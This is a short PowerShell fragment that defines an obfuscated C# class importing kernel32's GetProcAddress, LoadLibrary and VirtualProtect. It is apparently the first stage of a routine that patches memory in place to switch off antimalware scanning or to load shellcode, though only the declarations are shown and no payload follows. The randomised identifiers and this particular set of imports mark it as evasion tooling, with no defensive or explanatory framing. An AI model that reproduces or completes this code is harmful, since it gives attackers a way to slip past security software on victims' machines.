$hnkwv = @"
using System;
using System.Runtime.InteropServices;
public class hnkwv {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ieqpyn, uint flNewProtect, out uint lpflOldProtect);
}
"@
